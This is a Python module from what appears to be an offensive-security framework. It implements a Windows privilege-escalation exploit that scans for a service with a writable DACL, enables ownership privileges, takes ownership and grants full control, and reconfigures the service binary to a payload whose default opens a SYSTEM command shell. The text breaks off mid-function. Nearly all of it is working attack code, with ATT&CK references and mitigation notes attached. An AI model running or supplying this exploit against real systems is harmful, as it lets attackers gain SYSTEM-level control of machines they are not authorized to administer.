# modules/privilege-escalation/windows_service_abuse.py

"""
Windows Service Abuse Privilege Escalation Module

This exploit abuses a misconfigured Windows service DACL to:
  1. Take ownership of the service object
  2. Grant the current user full control
  3. Reconfigure its binary path to an arbitrary payload
  4. Start the service to execute the payload as SYSTEM

Requirements:
  * Windows OS
  * pywin32  (pip install pywin32)
"""

import os
from typing import Dict, Any, Optional

import win32api
import win32con
import win32event
import win32process
import win32security
import win32service
import win32serviceutil
import ntsecuritycon
from modules.exploits.exploit_template import Exploit, ExploitResult
from core.logging import setup_logger

logger = setup_logger(__name__, default_level="INFO")


class WindowsServiceAbuse(Exploit):
    name = "Windows Service Abuse"
    description = (
        "Abuse weak DACL on a Windows service to grant full control, "
        "reconfigure its binary path, and execute arbitrary code as SYSTEM."
    )
    target_platforms = ["Windows"]
    severity = "High"
    requires_auth = False
    metadata: Dict[str, Any] = {
        "references": [
            "https://attack.mitre.org/techniques/T1543/003/",
            "https://adsecurity.org/?p=1815"
        ],
        "mitigation_steps": [
            "Audit and tighten service DACLs",
            "Restrict SeTakeOwnershipPrivilege",
            "Harden service account permissions"
        ]
    }

    def check(self) -> bool:
        """
        Enumerate services and find one we can open with WRITE_DAC.
        """
        logger.debug("Scanning services for WRITE_DAC permissions...")
        svc = self._find_writable_service()
        if not svc:
            logger.warning("No service with exploitable DACL found.")
            return False

        self.target_service = svc
        logger.info("Selected service '%s' for abuse.", svc)
        return True

    def exploit(self) -> ExploitResult:
        """
        Perform privilege escalation:
          1) Enable required privileges
          2) Take ownership and grant full control
          3) Change binary path to payload
          4) Start the service
        """
        svc = self.target_service
        payload = self.options.get(
            "payload",
            r"cmd.exe /c start cmd.exe"  # default: launch SYSTEM shell
        )

        try:
            self._enable_privileges()
            self._take_ownership_and_grant_full_control(svc)
            self._reconfigure_service_binary(svc, payload)
            output = self._start_service(svc)
            return ExploitResult(True, output)
        except Exception as e:
            logger.error("Service abuse failed: %s", e, exc_info=True)
            return ExploitResult(False, str(e))

    def _find_writable_service(self) -> Optional[str]:
        scm = win32service.OpenSCManager(None, None, win32con.SC_MANAGER_ENUMERATE_SERVICE)
        try:
            services = win32service.EnumServicesStatus(scm)
            for (svc_type, svc_name, _) in services:
                try:
                    # try opening with WRITE_DAC right
                    handle = win32service.OpenService(
                        scm, svc_name, win32con.WRITE_DAC | win32con.READ_CONTROL
                    )
                    win32service.CloseServiceHandle(handle)
                    return svc_name
                except win32api.error:
                    continue
        finally:
            win32service.CloseServiceHandle(scm)
        return None

    def _enable_privileges(self) -> None:
        """
        Enable SeTakeOwnershipPrivilege and SeRestorePrivilege in our token.
        """
        logger.debug("Enabling SeTakeOwnershipPrivilege and SeRestorePrivilege...")
        token = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
        )
        for priv_name in ("SeTakeOwnershipPrivilege", "SeRestorePrivilege"):
            luid = win32security.LookupPrivilegeValue(None, priv_name)
            win32security.AdjustTokenPrivileges(
                token,
                False,
                [(luid, win32con.SE_PRIVILEGE_ENABLED)]
            )

    def _take_ownership_and_grant_full_control(self, svc_name: str) -> None:
        """
        Take ownership of the service object and grant full control to current user.
        """
        logger.debug("Taking ownership of service '%s'...", svc_name)
        # take ownership
        win32security.SetNamedSecurityInfo(
            svc_name,
            win32security.SE_SERVICE,
            win32security.OWNER_SECURITY_INFORMATION,
            win32security.GetTokenInformation(
                win32security.OpenProcessToken(
                    win32api.GetCurrentProcess(),
                    win32con.TOKEN_QUERY
                ),
                win32security.TokenUser
            )[0],
            None, None, None
        )

        # grant full control
        user_sid = win32security.GetTokenInformation(
            win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_QUERY
            ),
            win32security.TokenUser
        )[0]
        dacl = win32security.ACL()
        dacl.AddAccessAllowedAceEx(
            ntsecuritycon.ACL_REVISION,
            0,
            win32service.SERVICE_ALL_ACCESS,
            user_sid
        )
        win32security.SetNamed
